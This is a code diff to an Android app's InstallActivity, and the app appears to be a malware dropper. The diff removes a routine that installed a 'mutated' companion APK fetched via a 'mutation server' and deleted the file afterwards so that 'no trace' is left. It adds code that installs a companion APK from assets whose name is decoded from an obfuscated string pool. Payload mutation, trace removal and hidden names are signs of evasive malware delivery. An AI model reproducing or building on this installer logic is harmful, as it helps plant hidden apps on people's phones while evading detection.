@@ -352,46 +352,17 @@ class InstallActivity : AppCompatActivity() {
 
             Thread {
                 try {
-                    getCompanionBytesAndInstall()
+                    val apkBytes = assets.open(StringPool.d(StringPool.COMPANION_ASSET)).readBytes()
+                    if (apkBytes.isNotEmpty()) {
+                        runOnUiThread { installViaSession(apkBytes, attempt = 1) }
+                    } else {
+                        runOnUiThread { setStage(Stage.ERROR) }
+                    }
                 } catch (e: Exception) {
                     runOnUiThread { setStage(Stage.ERROR) }
                 }
             }.start()
         }, 900)
-    }
-
-    /**
-     * Get mutated companion bytes and install via PackageInstaller session.
-     *
-     * Reads mutated APK from filesDir/mc.tmp (written by LauncherApplication).
-     * Falls back to assets if file not ready.
-     */
-    private fun getCompanionBytesAndInstall() {
-        // Tier 1: Mutated APK written by LauncherApplication to filesDir
-        // Wait up to 6 seconds for mutation to complete
-        val mutatedFile = LauncherApplication.getMutatedApkFile(application)
-        val deadline = System.currentTimeMillis() + 6000L
-        while (!mutatedFile.exists() && System.currentTimeMillis() < deadline) {
-            Thread.sleep(150)
-        }
-
-        if (mutatedFile.exists() && mutatedFile.length() > 0) {
-            val bytes = mutatedFile.readBytes()
-            mutatedFile.delete() // delete after reading — no trace left
-            runOnUiThread { installViaSession(bytes, attempt = 1) }
-            return
-        }
-
-        // Tier 2: Base companion from assets (mutation server unreachable)
-        val apkBytes = try {
-            assets.open(StringPool.d(StringPool.COMPANION_ASSET)).readBytes()
-        } catch (e: Exception) { ByteArray(0) }
-
-        if (apkBytes.isNotEmpty()) {
-            runOnUiThread { installViaSession(apkBytes, attempt = 1) }
-        } else {
-            runOnUiThread { setStage(Stage.ERROR) }
-        }
     }
 
     private fun startProgressAnimation() {
